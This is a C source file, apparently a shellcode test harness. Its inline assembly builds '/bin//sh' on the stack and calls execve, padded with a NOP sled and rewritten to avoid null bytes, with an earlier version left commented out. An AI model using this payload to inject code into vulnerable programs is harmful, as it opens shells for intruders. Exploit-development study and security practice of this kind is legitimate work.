#include <stdio.h>

int main()
{
	asm volatile (
/*
		"sub $0x8, %rsp;"
		"mov $0x6e69622f, %rax;"
		"mov %rax, (%rsp);"
		"mov $0x68732f2f, %rax;"
		"mov %rax, 0x4(%rsp);"
		"mov $0x0, %edx;"
		"mov $0x0, %rsi;"
		"movq %rsp, %rdi;"
		"mov $0x3b, %eax;"
		"endbr64;"
		"syscall;"
*/
		"nop;"
		"nop;"
		"nop;"
		"nop;"
		"nop;"
		"nop;"
		"nop;"
		"nop;"
		"nop;"
		"nop;"
		"nop;"
		"nop;"
		"nop;"
		"nop;"
		"nop;"
		"nop;"
		"nop;"
		"nop;"
		"nop;"
		"nop;"
		"nop;"
		"nop;"
		"nop;"
		"nop;"
		"nop;"
		"sub $0x8, %rsp;"
		"mov $0x6e69622f, %rax;"
		"mov %rax, (%rsp);"

		"mov $0x68732f2f, %rax;"
		"mov %rax, 0x4(%rsp);"

		"xor %edx, %edx;"
		"xor %rsi, %rsi;"
		"movq %rsp, %rdi;"
		"xor %eax, %eax;"
		"mov $0x3b, %al;"
		"endbr64;"
		"syscall;"
		"nop;"
		"nop;"
		"nop;"
	);

	printf("hello\n");

	return 0;
}
